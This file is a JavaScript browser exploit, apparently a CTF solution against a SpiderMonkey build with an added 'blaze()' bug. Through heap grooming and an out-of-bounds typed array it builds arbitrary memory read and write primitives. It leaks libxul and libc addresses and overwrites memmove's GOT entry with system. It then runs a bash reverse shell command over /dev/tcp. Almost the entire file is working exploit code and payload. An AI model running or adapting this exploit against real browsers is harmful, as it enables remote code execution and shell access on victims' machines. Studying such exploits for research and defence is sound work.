/*

<elements>
<heap data>
<heap data>
<heap data>
<heap data>
.
.
.

arr[419]

arr = new Uint8Array(0x10);
arr.blaze();


arr1, arr2


<arr1 structure>
<arr1 elements data>
arr1.blaze()
...
<arr2 structure>

arr1[x: offset to elements ptr in arr2] = <got entry of memmove>
arr2[0] // -> leak
arr2[0] = ... // got overwrite

<arr2 elements data>



*/

var buf = new ArrayBuffer(8);
var u32 = new Uint32Array(buf);
var f64 = new Float64Array(buf);

function int2double(val)
{
    u32[0] = val % 0x100000000;
    u32[1] = val / 0x100000000;
    return f64[0];
}

function double2int(val)
{
    f64[0] = val;
    return u32[1]*0x100000000 + u32[0];
}

function log(val) {
	console.log('0x' + val.toString(16));
}

arr = new Array();
arr.push(new Array(1.1, 1.1));
for(i = 0; i < 100; ++i) {
	arr.push(new Uint32Array(24));	
}

for(i = 0; i < arr[1].length; ++i) {
	arr[1][i] = 0x41424142;
}

for(i = 0; i < arr[2].length; ++i) {
	arr[2][i] = 0x43444344;
}

arr[1].foo = Date.now;

arr[0].blaze();

// arr[0][9] -> arr[1] ka elements


ptr_ptr_date_now = double2int(arr[0][4]);
log(ptr_ptr_date_now);


elements = double2int(arr[0][9]);
log(elements);

function read_value(address) {
	arr[0][9] = int2double(address);
	return (arr[1][1] % 0x10000) * 0x100000000 + arr[1][0];
}

function write_value(address, value) {
	arr[0][9] = int2double(address);
	arr[1][0] = value % 0x100000000;
	arr[1][1] = value / 0x100000000;
}

ptr_date_now = (read_value(ptr_ptr_date_now) % 0x1000000000000) + 40;
log(ptr_date_now)
date_now = read_value(ptr_date_now);
log(date_now);

libxul_base = date_now - 0x49c7ab0;

memmove_got = libxul_base + 0x818b220;
memmove = read_value(memmove_got);
log(memmove_got);
log(memmove);

libc_base = memmove - 0x14dab0;
system = libc_base + 0x453a0;
log(libc_base);
log(system);

var target = new Uint8Array(100);
// var cmd = "/usr/bin/xcalc"
var cmd = "bash -ic 'sh -i >& /dev/tcp/127.0.0.1/1234 0>&1' &"

for (var i = 0; i < cmd.length; i++) {
    target[i] = cmd.charCodeAt(i);
}

target[cmd.length] = 0


write_value(memmove_got, system);


target.copyWithin(0,1);


/*

0x00007fd4dd6f7ab0

0x7f9cf44c6ab0
0x7f9cf44c6ab0

*/

// Math.atan2();

// console.log(objectAddress(arr[0]))
// console.log(objectAddress(arr[1]))
// console.log(objectAddress(arr[2]))

// elements = arr[0][39] * 0x100000000 + arr[0][38];
// console.log(elements.toString(16));


